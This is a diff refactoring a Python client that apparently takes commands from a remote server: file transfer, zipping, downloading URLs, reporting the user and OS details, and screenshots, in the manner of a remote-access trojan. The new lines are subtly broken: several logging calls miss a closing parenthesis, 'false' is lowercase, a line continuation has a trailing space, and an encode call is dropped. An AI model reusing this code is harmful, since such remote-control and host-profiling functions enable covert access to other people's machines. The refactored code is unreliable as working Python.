@@ -90,15 +90,15 @@ def reverse_readline(filename, buf_size=16384) -> str:
 def errors(ERROR, line=True) -> str:
     """ Error Handler """
     error_class = ERROR.__class__.__name__
-    error_msg = '%s:' % error_class
+    error_msg = f'{error_class}:'
     try:
-        error_msg += ' {0}'.format(ERROR.args[0])
+        error_msg += f' {ERROR.args[0]}'
     except Exception: pass
     if line:
         try:
             _, _, tb = sys.exc_info()
             line_number = traceback.extract_tb(tb)[-1][1]
-            error_msg += ' (line {0})'.format(line_number)
+            error_msg += f' (line {line_number})'
         except Exception: pass
     return error_msg
 
@@ -260,7 +260,7 @@ class Client(object):
         self.send(b'FILE_TRANSFER_DONE')
         self.receive()
         self.send(b'File Transferred Successfully')
-        logging.info('Transferred {} to Server'.format(file_to_transfer))
+        logging.info(f'Transferred {file_to_transfer} to Server'
         return
 
     def receive_file(self, save_as) -> None:
@@ -277,7 +277,7 @@ class Client(object):
                     break
                 f.write(data)
                 self.send(b'RECEIVED')
-        logging.info('Transferred {} to Client'.format(save_as))
+        logging.info(f'Transferred {save_as} to Client')
         return
 
     def receive_commands(self) -> None:
@@ -378,7 +378,7 @@ class Client(object):
                 continue
 
             if data[0] == 'ZIP_FILE':
-                logging.info('Zipping File: {}'.format(data[2]))
+                logging.info(f'Zipping File: {data[2]}'
                 try:
                     with ZipFile(data[1], 'w') as ziph:
                         ziph.write(data[2])
@@ -389,7 +389,7 @@ class Client(object):
                 continue
 
             if data[0] == 'ZIP_DIR':
-                logging.info('Zipping Folder: {}'.format(data[2]))
+                logging.info(f'Zipping Folder: {data[2]}'
                 try:
                     shutil.make_archive(data[1], 'zip', data[2])
                 except Exception as e:
@@ -399,7 +399,7 @@ class Client(object):
                 continue
 
             if data[0] == 'UNZIP':
-                logging.info('Unzipping: {}'.format(data[1]))
+                logging.info(f'Unzipping: {data[1]}'
                 try:
                     with ZipFile(data[1], 'r') as ziph:
                         ziph.extractall()
@@ -410,7 +410,7 @@ class Client(object):
                 continue
 
             if data[0] == 'DOWNLOAD':
-                logging.info('Downloading "{}" from {}'.format(data[2], data[1]))
+                logging.info(f'Downloading "{data[2]}" from {data[1]}'
                 try:
                     r = requests.get(data[1])
                     with open(data[2], 'wb') as f:
@@ -422,8 +422,9 @@ class Client(object):
                 continue
 
             if data[0] == 'INFO':
-                self.send('User: {}\nOS: {} {} ({}) ({})\nFrozen (.exe): {}\n'.format(getpass.getuser(), platform.system(),
-                    platform.release(), platform.platform(), platform.machine(), getattr(sys, 'frozen', False)).encode())
+                self.send(f'User: {getpass.getuser()}\n' \
+                    f'OS: {platform.system()} {platform.release()} ({platform.platform()}) ({platform.machine()})\n' \ 
+                    f'Frozen (.exe): {getattr(sys, "frozen", false)}\n')
                 continue
 
             if data[0] == 'SCREENSHOT':
